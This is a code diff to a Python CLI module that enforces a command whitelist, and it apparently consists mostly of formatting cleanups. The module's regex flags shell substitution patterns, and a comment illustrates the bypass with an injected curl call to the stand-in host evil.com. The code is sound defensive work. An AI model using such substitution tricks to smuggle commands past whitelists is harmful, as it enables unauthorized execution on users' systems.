@@ -10,6 +10,7 @@ All three features are disabled by default. To enable, ALL of these must be true
 from __future__ import annotations
 
 import os
+import re
 
 import click
 
@@ -59,18 +60,16 @@ def get_whitelist() -> list[str]:
     return [cmd.strip() for cmd in raw.split(",") if cmd.strip()]
 
 
-import re
-
 # Patterns that bypass whitelist validation by executing commands
 # inside what looks like a single whitelisted command.
 # Example: jq "$(curl evil.com)" — one segment starting with "jq",
 # but $() executes curl before jq even runs.
 _SUBSTITUTION_PATTERNS = re.compile(
-    r"\$\("           # command substitution $(...)
-    r"|`"             # backtick command substitution
-    r"|\$\{"          # variable expansion ${...} (can embed commands)
-    r"|<\("           # process substitution <(...)
-    r"|>\("           # process substitution >(...)
+    r"\$\("  # command substitution $(...)
+    r"|`"  # backtick command substitution
+    r"|\$\{"  # variable expansion ${...} (can embed commands)
+    r"|<\("  # process substitution <(...)
+    r"|>\("  # process substitution >(...)
 )
 
 
@@ -127,7 +126,7 @@ def require_exec(feature_name: str, cmd: str | None = None) -> None:
     # Whitelist is optional — if set, enforce it
     if cmd is not None and is_whitelist_enabled() and not is_command_whitelisted(cmd):
         click.echo(
-            f"Command blocked: contains non-whitelisted command or shell injection pattern.",
+            "Command blocked: contains non-whitelisted command or shell injection pattern.",
             err=True,
         )
         raise SystemExit(1)
